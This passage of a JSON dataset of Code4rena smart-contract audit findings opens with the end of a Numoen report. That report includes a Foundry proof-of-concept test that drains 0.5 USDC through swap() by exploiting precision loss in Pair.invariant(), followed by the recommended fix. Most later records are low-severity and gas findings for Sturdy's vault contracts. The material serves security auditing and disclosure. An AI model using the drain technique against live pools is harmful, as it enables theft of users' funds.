LiquidityManager.AddLiquidityParams({\n        token0: address(token0),\n        token1: address(token1),\n        token0Exp: token0Scale,\n        token1Exp: token1Scale,\n        upperBound: upperBound,\n        liquidity: liquidity,\n        amount0Min: amount0,\n        amount1Min: amount1,\n        sizeMin: 0,\n        recipient: cuh,\n        deadline: block.timestamp\n      })\n    );\n    vm.stopPrank();\n    showLendgineInfo();\n\n    // dennis starts with zero token\n    assertEq(token0.balanceOf(dennis), 0);\n\n    // dennis pulls 0.5 USDC free\n    lendgine.swap(\n      dennis,\n      5*10**5,\n      0,\n      abi.encode(\n        SwapCallbackData({token0: address(token0), token1: address(token1), amount0: 0, amount1: 0, payer: dennis})\n      )\n    );\n\n    showLendgineInfo();\n\n    // assert\n    assertEq(token0.balanceOf(dennis), 5*10**5);\n  }\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nMake sure to multiply first before division to prevent precision loss.\n\n```solidity\n  /// @inheritdoc IPair\n  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n    if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n\n    uint256 scale0 = FullMath.mulDiv(amount0 * token0Scale, 1e18, liquidity) ;//@audit-info change here\n    uint256 scale1 = FullMath.mulDiv(amount1 * token1Scale, 1e18, liquidity) ;//@audit-info change here\n\n    if (scale1 > 2 * upperBound) revert InvariantError();\n\n    uint256 a = scale0 * 1e18;\n    uint256 b = scale1 * upperBound;\n    uint256 c = (scale1 * scale1) / 4;\n    uint256 d = upperBound * upperBound;\n\n    return a + b >= c + d;\n  }\n\n```\n\n**[kyscott18 (Numoen) confirmed and commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/264#issuecomment-1423005106):**\n > We agree with the issue and implemented the same fix.\n\n\n\n***\n \n",
      "summary": "\nA bug report has been filed regarding a vulnerability in the code of the 'Pair.sol' file of the '2023-01-numoen' repository on GitHub. The vulnerability is related to the function 'Pair.invariant()', which is intended to prevent malicious trades. The bug is caused by a precision loss in lines 56 and 57, which can result in the wrong invariant check result.\n\nTo demonstrate the difference, a custom function 'invariant()' was written and tested. The test showed that while the reserve0 amount changed by 150%, the actual value 'a+b-c-d' did not change. This means that anyone can call 'swap()' to withdraw the excess value without affecting the invariant for pools with low decimals.\n\nTo mitigate the vulnerability, it is recommended to multiply first before division to prevent precision loss. This can be done by changing lines 56 and 57 of the 'Pair.sol' file.",
      "quality_score": 4.333333333333333,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "https://github.com/code-423n4/2023-01-numoen-findings/issues/264",
      "tags": [
        "Precision Loss",
        "Rounding"
      ],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "42593",
      "title": "[L-02] Can't remove old assets",
      "impact": "LOW",
      "content": "There is no way to remove old assets added by calls to `registerAsset()`. A disgruntled admin, before their access is revoked, can add a lot of assets and regularly sprinkle them with dust, so the new admins have to submit multiple calls to `distributeYield()` with different offsets and counts, to avoid the dust and possible reversion due to running out of gas\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/YieldManager.sol   #1\n\n118    function distributeYield(uint256 _offset, uint256 _count) external onlyAdmin {\n119      // 1. convert from asset to exchange token via uniswap\n120      for (uint256 i = 0; i < _count; i++) {\n121        address asset = _assetsList[_offset + i];\n122        require(asset != address(0), Errors.UL_INVALID_INDEX);\n123        uint256 _amount = IERC20Detailed(asset).balanceOf(address(this));\n124        _convertAssetToExchangeToken(asset, _amount);\n125:     }\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L118-L125\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22245",
      "title": "[N-13] Consider two-phase ownership transfer",
      "impact": "LOW",
      "content": "Consider adding a two-phase transfer, where the current owner nominates the next owner, and the next owner has to call `accept*()` to become the new owner. This prevents passing the ownership to an account that is unable to use it.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/YieldManager.sol   #1\n\n26:  contract YieldManager is VersionedInitializable, Ownable {\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L26\n\n**[sforman2000 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/69#issuecomment-1129470623):**\n > Particularly high quality.\n\n**[atozICT20 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/69#issuecomment-1134999270):**\n > L1: Fixed<br>\n> L2: Fixed<br>\n> L3: Fixed<br>\n> L4: Invalid. ETH constant may be used in several child contract.<br>\n> L5: Admin can monitor it.<br>\n> L6: Invalid. LidoVault can be received ETH from CurveSwap<br>\n> L7: No need to change<br>\n> L8: Fixed<br>\n> L9: Fixed<br>\n> N1: Fixed<br>\n> N2: Fixed<br>\n> N3: Invalid<br>\n> N4: Fixed<br>\n> N5: Fixed<br>\n> N6: Fixed<br>\n> N7: Fixed<br>\n> N8: Fixed<br>\n> N9: No need to change<br>\n> N10: Invalid<br>\n> N11: Invalid<br>\n> N12: Fixed<br>\n> N13: No need to change<br>\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/69#issuecomment-1147044556):**\n > L5 should be addressed IMO. there is an inconsistency between addresses being used. The LIDO vault should be using the ETH constant instead of the null address for ETH, or vice versa. For someone who uses etherscan, he'll see the `ETH` constant define and assumes that he should be using that to specify ETH, then wonder why his tx will potentially revert in Metamask. \n\n> **Low issues:** L1, L2, L3, L4, L5, L7, centralisation risk<br>\n> **NC issues:** L8, L9, N1, N2, N3 (more of sponsor acknowledged), N4, N5, N6, N7 (reasoning is diff from N6), N8, N9, N12, N13<br>\n> **Invalid:** L6, N10 (some fields are not worth the extra gas to index), N11 (no justification)<br>\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22244",
      "title": "[N-12] Remove commented out code",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n144    // /**\n145    //  * @dev Convert an `amount` of asset used as collateral to swappable asset on liquidation.\n146    //  * @param _amountIn The amount of collateral asset\n147    //  */\n148:   // function convertOnLiquidation(address _assetOut, uint256 _amountIn) external virtual {}\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L144-L148\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22243",
      "title": "[N-11] Consider allowing the passing of a referral code",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n81       ILendingPool(_addressesProvider.getLendingPool()).deposit(\n82         _stAsset,\n83         _stAssetAmount,\n84         msg.sender,\n85         0\n86:      );\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L81-L86\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22242",
      "title": "[N-10] Event is missing `indexed` fields",
      "impact": "LOW",
      "content": "Each `event` should use three `indexed` fields if there are three or more fields\n\n*There are 4 instances of this issue:*\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n24:     event ProcessYield(address indexed collateralAsset, uint256 yieldAmount);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L24\n\n```solidity\nFile: smart-contracts/GeneralVault.sol   #2\n\n25:     event DepositCollateral(address indexed collateralAsset, address indexed from, uint256 amount);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L25\n\n```solidity\nFile: smart-contracts/GeneralVault.sol   #3\n\n26:     event WithdrawCollateral(address indexed collateralAsset, address indexed to, uint256 amount);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L26\n\n```solidity\nFile: smart-contracts/GeneralVault.sol   #4\n\n27:     event SetTreasuryInfo(address indexed treasuryAddress, uint256 fee);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L27\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22241",
      "title": "[N-09] NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n*There are 2 instances of this issue:*\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n/// @audit Missing: '@return'\n134      * @param _amount The amount to be withdrawn\n135      */\n136     function withdrawOnLiquidation(address _asset, uint256 _amount)\n137       external\n138       virtual\n139:      returns (uint256)\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L134-L139\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #2\n\n/// @audit Missing: '@return'\n104      * @param _tokenOut The address of token being received\n105      */\n106:    function getCurvePool(address _tokenIn, address _tokenOut) external view returns (address) {\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L104-L106\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22240",
      "title": "[N-08] Variable names that consist of all capital letters should be reserved for `const`/`immutable` variables",
      "impact": "LOW",
      "content": "If the variable needs to be different based on which class it comes from, a `view`/`pure` _function_ should be used instead (e.g. like [this](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/76eee35971c2541585e05cbf258510dda7b2fbc6/contracts/token/ERC20/extensions/draft-IERC20Permit.sol#L59)).\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/LidoVault.sol   #1\n\n127:      address LIDO = _addressesProvider.getAddress('LIDO');\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L127\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22239",
      "title": "[N-07] Use a more recent version of solidity",
      "impact": "LOW",
      "content": "Use a solidity version of at least 0.8.4 to get `bytes.concat()` instead of `abi.encodePacked(<bytes>,<bytes>)`<br>\nUse a solidity version of at least 0.8.12 to get `string.concat()` instead of `abi.encodePacked(<str>,<str>)`\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol   #1\n\n2:    pragma solidity 0.6.12;\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L2\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22238",
      "title": "[N-06] Use a more recent version of solidity",
      "impact": "LOW",
      "content": "Use a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions\n\n*There are 3 instances of this issue:*\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n2:    pragma solidity 0.6.12;\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L2\n\n```solidity\nFile: smart-contracts/LidoVault.sol   #2\n\n2:    pragma solidity 0.6.12;\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L2\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #3\n\n2:    pragma solidity 0.6.12;\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L2\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22237",
      "title": "[N-05] Missing event for critical parameter change",
      "impact": "LOW",
      "content": "\n*There are 2 instances of this issue:*\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol   #1\n\n37      function setConfiguration(address _lpToken, uint256 _poolId) external onlyAdmin {\n38        require(internalAssetToken == address(0), Errors.VT_INVALID_CONFIGURATION);\n39    \n40        convexBooster = 0xF403C135812408BFbE8713b5A23a04b3D48AAE31;\n41        curveLPToken = _lpToken;\n42        convexPoolId = _poolId;\n43        SturdyInternalAsset _interalToken = new SturdyInternalAsset(\n44          string(abi.encodePacked('Sturdy ', IERC20Detailed(_lpToken).symbol())),\n45          string(abi.encodePacked('c', IERC20Detailed(_lpToken).symbol())),\n46          IERC20Detailed(_lpToken).decimals()\n47        );\n48        internalAssetToken = address(_interalToken);\n49:     }\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L37-L49\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #2\n\n64      function setExchangeToken(address _token) external onlyAdmin {\n65        require(_token != address(0), Errors.VT_INVALID_CONFIGURATION);\n66        _exchangeToken = _token;\n67:     }\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L64-L67\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22236",
      "title": "[N-04] Redundant cast",
      "impact": "LOW",
      "content": "The type of the variable is the same as the type to which the variable is being cast\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/LidoVault.sol   #1\n\n140:        (bool sent, bytes memory data) = address(_to).call{value: receivedETHAmount}('');\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L140\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22235",
      "title": "[N-03] `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "\n*There are 6 instances of this issue:*\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol\n\n/// @audit 0xF403C135812408BFbE8713b5A23a04b3D48AAE31\n40:       convexBooster = 0xF403C135812408BFbE8713b5A23a04b3D48AAE31;\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L40\n\n```solidity\nFile: smart-contracts/GeneralVault.sol\n\n/// @audit 99_00\n125:      require(withdrawAmount >= _amount.percentMul(99_00), Errors.VT_WITHDRAW_AMOUNT_MISMATCH);\n\n/// @audit 30_00\n167:      require(_fee <= 30_00, Errors.VT_FEE_TOO_BIG);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L125\n\n```solidity\nFile: smart-contracts/LidoVault.sol\n\n/// @audit 200\n48:         200\n\n/// @audit 1e18\n73:       return 1e18;\n\n/// @audit 200\n136:          200\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L48\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22234",
      "title": "[N-02] `public` functions not called by the contract should be declared `external` instead",
      "impact": "LOW",
      "content": "Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n*There are 3 instances of this issue:*\n```solidity\nFile: smart-contracts/CollateralAdapter.sol   #1\n\n35:     function initialize(ILendingPoolAddressesProvider _provider) public initializer {\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/CollateralAdapter.sol#L35\n\n```solidity\nFile: smart-contracts/GeneralVault.sol   #2\n\n61:     function initialize(ILendingPoolAddressesProvider _provider) public initializer {\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L61\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #3\n\n60:     function initialize(ILendingPoolAddressesProvider _provider) public initializer {\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L60\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22233",
      "title": "[N-01] `override` function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings",
      "impact": "LOW",
      "content": "\n*There are 2 instances of this issue:*\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol   #1\n\n154:    function _getWithdrawalAmount(address _asset, uint256 _amount)\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L154\n\n```solidity\nFile: smart-contracts/LidoVault.sol   #2\n\n109:    function _getWithdrawalAmount(address _asset, uint256 _amount)\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L109\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5441",
      "title": "[G-17] `public` functions not called by the contract should be declared `external` instead",
      "impact": "GAS",
      "content": "\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public` and can save gas by doing so.\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: smart-contracts/CollateralAdapter.sol   #1\n\n35:     function initialize(ILendingPoolAddressesProvider _provider) public initializer {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/CollateralAdapter.sol#L35>\n\n```solidity\nFile: smart-contracts/GeneralVault.sol   #2\n\n61:     function initialize(ILendingPoolAddressesProvider _provider) public initializer {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L61>\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #3\n\n60:     function initialize(ILendingPoolAddressesProvider _provider) public initializer {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L60>\n\n**[sforman2000 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/68#issuecomment-1129470702):**\n > Particularly high quality.\n\n**[iris112 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/68#issuecomment-1130365653):**\n > `3. Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate`<br>\n> This is not correct.<br>\n> I have a simple test on remix and confirmed there is no effect. In fact the case of using struct type spent more gas (+65 gas)<br>\n> Let me know your example.\n\n**[iris112 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/68#issuecomment-1130368148):**\n > `2. Add an unregisterAsset() function`<br>\n> Yeah we need unregisterAsset function, but not sure about the resetting 0 should be efficient to reduce gas. Normally non-zero to non-zero is cheaper than zero to non-zero.<br>\n> I think we don't need additional feature to reset 0.\n\n**[iris112 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/68#issuecomment-1130442962):**\n > `9. Using > 0 costs more gas than != 0 when used on a uint in a require() statement`<br>\n> This is also not correct.<br>\n> I checked on remix with your same example, but _greater_ is less than _not equal_.<br>\n> _greater: 30 gas<br>\n> equal: 30 gas<br>\n> greaterThan: 33 gas<br>\n> notequal: 33 gas_<br>\n> \n> ![image](https://user-images.githubusercontent.com/4359914/169141789-28c9e292-20c9-426e-932e-e2c595622f09.png)\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-17-public-functions-not-called-by-the-contract-should-be-declared-external-instead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5440",
      "title": "[G-13] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: smart-contracts/CollateralAdapter.sol\n\n22:     uint256 public constant VAULT_REVISION = 0x1;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/CollateralAdapter.sol#L22>\n\n```solidity\nFile: smart-contracts/GeneralVault.sol\n\n55:     uint256 public constant VAULT_REVISION = 0x1;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L55>\n\n```solidity\nFile: smart-contracts/YieldManager.sol\n\n41:     uint256 public constant VAULT_REVISION = 0x1;\n\n48:     uint256 public constant UNISWAP_FEE = 10000; // 1%\n\n49:     uint256 public constant SLIPPAGE = 500; // 5%\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L41>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-13-using-private-rather-than-public-for-constants-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5439",
      "title": "[G-12] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "\nSaves 6 gas *PER LOOP*\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol\n\n106:      for (uint256 i = 0; i < extraRewardsLength; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L106>\n\n```solidity\nFile: smart-contracts/GeneralVault.sol\n\n218:      for (uint256 i = 0; i < length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L218>\n\n```solidity\nFile: smart-contracts/YieldManager.sol\n\n120:      for (uint256 i = 0; i < _count; i++) {\n\n130:      for (uint256 i = 0; i < assetYields.length; i++) {\n\n156:      for (uint256 i = 0; i < length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L120>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-12-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too",
      "tags": [],
      "finders": []
    },
    {
      "id": "5438",
      "title": "[G-11] `internal` functions not called by the contract should be removed to save deployment gas",
      "impact": "GAS",
      "content": "\nIf the functions are required by an interface, the contract should inherit from that interface and use the `override` keyword\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n204:    function _getAssetYields(uint256 _WETHAmount) internal view returns (AssetYield[] memory) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L204>\n\n```solidity\nFile: smart-contracts/GeneralVault.sol   #2\n\n235:    function _depositYield(address _asset, uint256 _amount) internal {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L235>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-11-internal-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5437",
      "title": "[G-09] Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "\nThis change saves [6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png) per instance\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n179:      require(yieldStAsset > 0, Errors.VT_PROCESS_YIELD_INVALID);\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L179>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-09-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "5436",
      "title": "[G-06] `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "\nThe overheads outlined below are *PER LOOP*, excluding the first loop\n\n*   storage arrays incur a Gwarmaccess (100 gas)\n*   memory arrays use `MLOAD` (3 gas)\n*   calldata arrays use `CALLDATALOAD` (3 gas)\n\nCaching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #1\n\n130:      for (uint256 i = 0; i < assetYields.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L130>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-06-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop",
      "tags": [],
      "finders": []
    },
    {
      "id": "5435",
      "title": "[G-05] `internal` functions only called once can be inlined to save gas",
